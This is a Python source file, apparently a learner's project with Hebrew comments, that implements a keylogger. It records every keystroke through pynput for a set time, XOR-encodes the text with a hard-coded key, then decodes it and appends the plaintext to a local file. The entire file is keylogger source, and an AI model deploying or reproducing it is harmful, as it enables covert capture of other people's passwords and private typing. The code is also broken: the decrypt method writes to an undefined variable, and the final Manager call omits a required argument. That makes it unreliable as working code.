from datetime import datetime
from time import sleep
import os
from pynput import keyboard
from collections import defaultdict
import time
import threading


class Key_loger:
    def __init__(self, time_to_run):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.time_to_run = time_to_run
        self.listener.start()
        self.press_char = []

    def stop_after_one_minute(self):
        start_time = time.time()
        while time.time() - start_time < self.time_to_run * 60:
            sleep(1)
        self.listener.stop()
        string = "".join(self.press_char)
        return string


        # self.listener.stop()

    # def stop_after_one_minute(self):
    #     string = "".join(self.press_char)
    #     return string

    def on_press(self, key):
        """ מאזין להקשות מקשים ושומר אותן לפי זמן """
        try:
            formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
            if hasattr(key, 'char') and key.char is not None:
                self.press_char.append(key.char)
            else:
                self.press_char.append(key.name if hasattr(key, "name") else str(key))
        except Exception as e:
            print(f"שגיאה: {e}")


class Writer:
    def __init__(self, data, file_name):
        self.data = data
        self.file_name = file_name
        self.write()

    def write(self):
        with open(self.file_name, "a") as f:
            f.write(self.data)


class EncryptorAndDecryptor:
    def __init__(self, data):
        self.data = data
        self.encrypted_file_name = "key_logger_encrypted_file.txt"
        self.decrypted_file_name = "key_logger_non_encrypted_file.txt"
        self.key_word = "613"

    def encrypt(self):
        encrypted_string = ""
        key_length = len(self.key_word)

        # with open(self.decrypted_file_name, "r") as read_file:
        #     text = read_file.read()  # Read full file content

        #do xor as cycle through Key
        for i in range(len(self.data)):
            encrypted_string += chr(ord(self.data[i]) ^ ord(self.key_word[i % key_length]))  #

        # with open(self.encrypted_file_name, "w") as f:  #remember overwrting
        #    f.write(string)
        return encrypted_string

    def decrypt(self, encrypted_txt):
        decrypted_string = ""
        key_length = len(self.key_word)

        # with open(self.encrypted_file_name, "r") as read_file:
        #     encrypted_text = read_file.read()  # Read full encrypted content

        #do xor as cycle through Key
        for i in range(len(encrypted_txt)):
            string += chr(ord(encrypted_txt[i]) ^ ord(self.key_word[i % key_length]))

        return decrypted_string
        # with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
        #     f.write(string)


class Manager:
    def __init__(self, time_to_run, bool_decrypt_or_encrypt):
        self.time_to_run = time_to_run  # must be in minutes...it'll then iterate through this for 60 second intervals!
        self.run_key_logger()

    def run_key_logger(self):
        kl = Key_loger(self.time_to_run)
        logged_data = kl.stop_after_one_minute() # iterates through one at a time

        # #encrypt and write encrypted data
        encryptor = EncryptorAndDecryptor(logged_data)
        encrypted_data = encryptor.encrypt()
        # Writer(encrypted_data, encryptor.encrypted_file_name)

        #decrypte + write decrypted data
        decrypted_data = encryptor.decrypt(encrypted_data)
        Writer(decrypted_data, encryptor.decrypted_file_name)


# Run the key logger for 2 minute and save the encrypted and decrypted files
mc = Manager(0)
